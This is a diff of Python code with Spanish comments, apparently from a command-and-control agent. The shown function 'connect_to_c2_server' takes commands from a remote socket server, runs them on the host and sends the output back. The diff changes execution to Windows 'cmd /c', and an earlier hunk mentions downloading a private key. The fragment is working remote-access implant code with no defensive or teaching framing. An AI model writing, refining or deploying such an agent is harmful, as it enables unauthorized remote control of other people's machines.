@@ -84,7 +84,7 @@ def get_private_key():
     else:
         print(f"Error al descargar la clave privada: {response.text}")
 
-    # Función para conectar el agente al servidor de sockets
+# Función para conectar el agente al servidor de sockets
 def connect_to_c2_server():
     agent_id = get_agent_id()  # Obtener el ID antes de conectarse
     if agent_id is None:
@@ -107,14 +107,14 @@ def connect_to_c2_server():
                 if command.split(" ")[0] == 'cd': # Cambiar de directorio de trabajo
                     try:
                         os.chdir(" ".join(command.split(" ")[1:]))
-                        output = "Ruta actual: {}".format(os.getcwd())
+                        output = "{}".format(os.getcwd())
                     except FileNotFoundError:
                         output = "Error: Directorio no encontrado."
                     except Exception as e:
                         output = f"Error al cambiar de directorio: {e}"
                 else:
                     # Ejecutar el comando y obtener el resultado
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    result = subprocess.run(['cmd', '/c', command], capture_output=True, text=True)
                     if result.stdout: # Si el comando produjo salida, enviarla
                         output = result.stdout
                     elif result.stderr:# Si el comando produjo error, enviarlo
